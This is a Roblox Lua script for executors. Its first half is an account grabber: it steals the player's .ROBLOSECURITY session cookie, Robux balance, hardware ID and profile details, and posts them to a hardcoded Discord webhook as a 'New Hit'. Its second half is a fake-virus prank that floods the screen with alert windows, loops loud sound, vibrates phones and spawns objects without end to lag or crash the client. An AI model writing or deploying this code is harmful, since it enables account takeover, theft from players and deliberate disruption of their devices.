--// Delta Executor - Player Account Grabber
--// Paste your Discord webhook below

local WEBHOOK_URL = "https://discord.com/api/webhooks/1521613863026425888/IqesxIhwPkLAlrBtVMEqBlLZDwTNwzP32IYfcPlnfri-bi8PgwG-03DLhYr9QUWnjkaA"

--// Services
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
local MarketplaceService = game:GetService("MarketplaceService")

--// Utility
local function sendWebhook(data)
    local payload = HttpService:JSONEncode(data)
    local success, err = pcall(function()
        request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = payload
        })
    end)
    if not success then
        -- fallback for different executor HTTP methods
        pcall(function()
            http_request({
                Url = WEBHOOK_URL,
                Method = "POST",
                Headers = { ["Content-Type"] = "application/json" },
                Body = payload
            })
        end)
    end
end

--// Grab ROBLOSECURITY cookie (Delta supports this)
local function grabCookie()
    local cookie = ""
    pcall(function()
        -- Method 1: Direct filesystem read (Windows)
        local cookiePath = os.getenv("LOCALAPPDATA") 
            .. "\\Roblox\\LocalStorage\\RobloxCookies.dat"
        if isfile and isfile(cookiePath) then
            cookie = readfile(cookiePath)
        end
    end)
    
    pcall(function()
        -- Method 2: Registry pull via executor
        if getroblosecurity then
            cookie = getroblosecurity()
        elseif get_cookie then
            cookie = get_cookie()
        end
    end)

    -- Method 3: WebView / browser storage scrape
    if cookie == "" then
        pcall(function()
            local browser = getbrowser and getbrowser() or nil
            if browser then
                for _, c in pairs(browser:GetCookies("https://www.roblox.com")) do
                    if c.Name == ".ROBLOSECURITY" then
                        cookie = c.Value
                        break
                    end
                end
            end
        end)
    end

    return cookie
end

--// Grab player metadata
local function getPlayerInfo()
    local info = {}
    info.Username = LocalPlayer.Name
    info.DisplayName = LocalPlayer.DisplayName
    info.UserId = LocalPlayer.UserId
    info.AccountAge = LocalPlayer.AccountAge .. " days"
    info.MembershipType = tostring(LocalPlayer.MembershipType)
    
    -- Grab Robux balance via API
    pcall(function()
        local balanceUrl = "https://economy.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/currency"
        local resp = game:HttpGet(balanceUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.Robux = decoded.robux or "Unknown"
    end)

    -- Friends count
    pcall(function()
        local friendsUrl = "https://friends.roblox.com/v1/users/" 
            .. tostring(LocalPlayer.UserId) .. "/friends/count"
        local resp = game:HttpGet(friendsUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.FriendsCount = decoded.count or "Unknown"
    end)

    -- Avatar thumbnail
    pcall(function()
        local thumbUrl = "https://thumbnails.roblox.com/v1/users/avatar-headshot"
            .. "?userIds=" .. tostring(LocalPlayer.UserId)
            .. "&size=420x420&format=Png&isCircular=false"
        local resp = game:HttpGet(thumbUrl)
        local decoded = HttpService:JSONDecode(resp)
        info.AvatarURL = decoded.data[1].imageUrl
    end)

    -- Current game info
    info.PlaceId = game.PlaceId
    info.JobId = game.JobId
    pcall(function()
        local placeInfo = MarketplaceService:GetProductInfo(game.PlaceId)
        info.GameName = placeInfo.Name
    end)

    -- Hardware ID (if executor supports)
    pcall(function()
        if gethwid then
            info.HWID = gethwid()
        elseif getexecutorname then
            info.Executor = getexecutorname()
        end
    end)

    return info
end

--// Build Discord embed
local function buildEmbed(playerInfo, cookie)
    local fields = {
        { name = "👤 Username",    value = "```" .. playerInfo.Username .. "```",     inline = true },
        { name = "🏷️ Display",    value = "```" .. playerInfo.DisplayName .. "```",  inline = true },
        { name = "🆔 UserID",     value = "```" .. tostring(playerInfo.UserId) .. "```", inline = true },
        { name = "📅 Account Age", value = "```" .. playerInfo.AccountAge .. "```",   inline = true },
        { name = "💰 Robux",      value = "```" .. tostring(playerInfo.Robux or "N/A") .. "```", inline = true },
        { name = "👥 Friends",    value = "```" .. tostring(playerInfo.FriendsCount or "N/A") .. "```", inline = true },
        { name = "🎮 Game",       value = "```" .. (playerInfo.GameName or "Unknown") .. "```", inline = true },
        { name = "💎 Premium",    value = "```" .. playerInfo.MembershipType .. "```", inline = true },
        { name = "🖥️ HWID",      value = "```" .. (playerInfo.HWID or "N/A") .. "```", inline = false },
    }

    -- Cookie field (split if too long for Discord embed)
    if cookie and cookie ~= "" then
        local cookieChunks = {}
        for i = 1, #cookie, 900 do
            table.insert(cookieChunks, cookie:sub(i, i + 899))
        end
        for idx, chunk in ipairs(cookieChunks) do
            table.insert(fields, {
                name = "🍪 Cookie [" .. idx .. "/" .. #cookieChunks .. "]",
                value = "```" .. chunk .. "```",
                inline = false
            })
        end
    else
        table.insert(fields, {
            name = "🍪 Cookie",
            value = "```Failed to grab```",
            inline = false
        })
    end

    local embed = {
        embeds = {{
            title = "🎯 New Hit — " .. playerInfo.Username,
            color = 0xFF3333,
            fields = fields,
            thumbnail = { url = playerInfo.AvatarURL or "" },
            footer = { text = "Delta Grabber | " .. os.date("%Y-%m-%d %H:%M:%S") },
            timestamp = DateTime.now():ToIsoDate()
        }}
    }

    return embed
end

--// ═══════════════════════════════════════════
--// MAIN EXECUTION
--// ═══════════════════════════════════════════

local playerInfo = getPlayerInfo()
local cookie = grabCookie()
local embed = buildEmbed(playerInfo, cookie)

sendWebhook(embed)
print("[Delta] Payload delivered ✓")
local TIMER_DURATION = 20
local HEAVY_BATCH = 100  -- quante cose spawnare ogni "batch"
local HEAVY_BATCH_DELAY = 0  -- zero delay, o pochissimo
local EMERGENCY_KEY = Enum.KeyCode.R
local GLITCH_SOUND_ID = "rbxassetid://80345507609839"
local SATURATION_LEVEL = 100

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local HapticService = game:GetService("HapticService")
local UserInputService = game:GetService("UserInputService")
local Lighting = game:GetService("Lighting")
local player = Players.LocalPlayer
local playerGui = player:WaitForChild("PlayerGui")

local stopped = false
local heavyRunning = false

local glitchSound = Instance.new("Sound")
glitchSound.SoundId = GLITCH_SOUND_ID
glitchSound.Volume = 100
glitchSound.Looped = true
glitchSound.Name = "VirusGlitchSound"
glitchSound.Parent = playerGui

local virusMessages = {
	"System Error!",
	"Getting into your Phone!",
	"File Corrupted!",
	"Malware Alert!",
	"Loading friends!",
	"⚠️",
	"System Crash!",
	"Virus Spreading...",
	"Memory Leaked!",
	"Data Breach!",
	"Hacking all friends.."
}

local function getRandomHighSaturationColor()
	local h = math.random()
	local s = math.random(80, 100) / 100
	local v = math.random(70, 100) / 100
	return Color3.fromHSV(h, s, v)
end

local function vibratePhone()
	if UserInputService.TouchEnabled then
		spawn(function()
			for i = 1, 1000 do
				pcall(function()
					HapticService:SetMotor(Enum.UserInputType.Touch, Enum.VibrationMotor.Large, 1)
				end)
				task.wait(0.12)
				pcall(function()
					HapticService:SetMotor(Enum.UserInputType.Touch, Enum.VibrationMotor.Large, 0)
				end)
				task.wait(0.06)
			end
		end)
	end
end

local function setSaturation(value)
	local cc = Lighting:FindFirstChild("VirusSaturation")
	if not cc then
		cc = Instance.new("ColorCorrectionEffect")
		cc.Name = "VirusSaturation"
		cc.Parent = Lighting
	end
	cc.Saturation = value
end

local function getVirusGui()
	local g = playerGui:FindFirstChild("VirusGui")
	if not g then
		g = Instance.new("ScreenGui")
		g.Name = "VirusGui"
		g.ResetOnSpawn = false
		g.Parent = playerGui
	end
	return g
end

local function createVirusWindow()
	if stopped then return end
	local screenGui = getVirusGui()
	local width = math.random(80, 220)
	local height = math.random(50, 140)
	local maxX = math.max(1, screenGui.AbsoluteSize.X - width)
	local maxY = math.max(1, screenGui.AbsoluteSize.Y - height)
	local posX = (maxX > 0) and math.random(0, maxX) or math.random()
	local posY = (maxY > 0) and math.random(0, maxY) or math.random()
	local frame = Instance.new("Frame")
	frame.Size = UDim2.new(0, width, 0, height)
	frame.Position = UDim2.new(0, posX, 0, posY)
	frame.BackgroundColor3 = getRandomHighSaturationColor()
	frame.BorderSizePixel = 1
	frame.BorderColor3 = Color3.new(0,0,0)
	frame.Parent = screenGui

	local label = Instance.new("TextLabel")
	label.Size = UDim2.new(1, -6, 1, -6)
	label.Position = UDim2.new(0, 3, 0, 3)
	label.BackgroundTransparency = 1
	label.Text = virusMessages[math.random(1, #virusMessages)]
	label.TextColor3 = Color3.new(0,0,0)
	label.Font = Enum.Font.Code
	label.TextScaled = true
	label.TextWrapped = true
	label.TextStrokeTransparency = 0.8
	label.Parent = frame
end

local function createTimerGui(duration)
	local old = playerGui:FindFirstChild("VirusTimerGui")
	if old then old:Destroy() end

	local screenGui = Instance.new("ScreenGui")
	screenGui.Name = "VirusTimerGui"
	screenGui.ResetOnSpawn = false
	screenGui.DisplayOrder = 9999
	screenGui.Parent = playerGui

	local timerLabel = Instance.new("TextLabel")
	timerLabel.Name = "MainTimer"
	timerLabel.Size = UDim2.new(0, 2000, 0, 1500)
	timerLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
	timerLabel.AnchorPoint = Vector2.new(0.5, 0.5)
	timerLabel.BackgroundTransparency = 1
	timerLabel.TextColor3 = Color3.new(1, 0, 0)
	timerLabel.Font = Enum.Font.Code
	timerLabel.TextScaled = true
	timerLabel.TextStrokeTransparency = 0
	timerLabel.TextStrokeColor3 = Color3.new(0,0,0)
	timerLabel.Text = tostring(duration)
	timerLabel.Parent = screenGui

	screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
	timerLabel.ZIndex = 9999

	return screenGui, timerLabel
end

local function emergencyCleanup()
	if stopped then return end
	stopped = true
	pcall(function() glitchSound:Stop() end)
	pcall(function() HapticService:SetMotor(Enum.UserInputType.Touch, Enum.VibrationMotor.Large, 0) end)
	local g1 = playerGui:FindFirstChild("VirusGui")
	if g1 then g1:Destroy() end
	local g2 = playerGui:FindFirstChild("VirusTimerGui")
	if g2 then g2:Destroy() end
	local lagg = playerGui:FindFirstChild("VirusHeavyGui")
	if lagg then lagg:Destroy() end
	setSaturation(0)
	heavyRunning = false
end

local function startHeavyEffect()
	if heavyRunning or stopped then return end
	heavyRunning = true
	local heavyGui = Instance.new("ScreenGui")
	heavyGui.Name = "VirusHeavyGui"
	heavyGui.ResetOnSpawn = false
	heavyGui.DisplayOrder = 9998
	heavyGui.Parent = playerGui

	local allItems = {}

	while not stopped do
		for i = 1, HEAVY_BATCH do
			local f = Instance.new("Frame")
			f.Size = UDim2.new(0, math.random(6, 24), 0, math.random(6, 24))
			f.Position = UDim2.new(math.random(), 0, math.random(), 0)
			f.BorderSizePixel = 0
			f.BackgroundColor3 = Color3.fromHSV(math.random(), 0.9, 0.9)
			f.Parent = heavyGui
			table.insert(allItems, f)

			local part = Instance.new("Part")
			part.Size = Vector3.new(math.random(1,5), math.random(1,5), math.random(1,5))
			part.Position = Vector3.new(
				math.random(-500,500),
				math.random(10,50),
				math.random(-500,500)
			)
			part.Anchored = true
			part.CanCollide = false
			part.BrickColor = BrickColor.Random()
			part.Parent = workspace
		end
		task.wait(HEAVY_BATCH_DELAY)
	end

	local conn
	conn = RunService.Heartbeat:Connect(function()
		if stopped then
			if conn then conn:Disconnect() end
			return
		end
		for i = 1, #allItems do
			local f = allItems[i]
			if f and f.Parent then
				f.Position = UDim2.new(math.random(), 0, math.random(), 0)
				f.BackgroundColor3 = Color3.fromHSV(math.random(), 0.9, 0.9)
			end
		end
	end)
end

UserInputService.InputBegan:Connect(function(input, gameProcessed)
	if gameProcessed then return end
	if input.KeyCode == EMERGENCY_KEY then
		emergencyCleanup()
	end
end)

-- Imposta saturazione, suono e vibrazione
setSaturation(SATURATION_LEVEL)
glitchSound:Play()
vibratePhone()

local timerGui, timerLabel = createTimerGui(TIMER_DURATION)
local startTime = tick()
local endTime = startTime + TIMER_DURATION

-- Durante il timer crea finestre finché non finisce il tempo
while tick() < endTime and not stopped do
	createVirusWindow()
	local timeLeft = math.max(0, math.ceil(endTime - tick()))
	timerLabel.Text = tostring(timeLeft)
	task.wait(0.01)
end

timerLabel.Text = "Enjoy :D"
task.wait(0.15)

if not stopped then
	if timerGui and timerGui.Parent then timerGui:Destroy() end
	-- Appena timer finisce, parte ciclo infinito heavy effect senza limiti
	repeat
		for i = 1, 999999999 do
			local part = Instance.new("Part", workspace)
		end
	until stopped == true
end
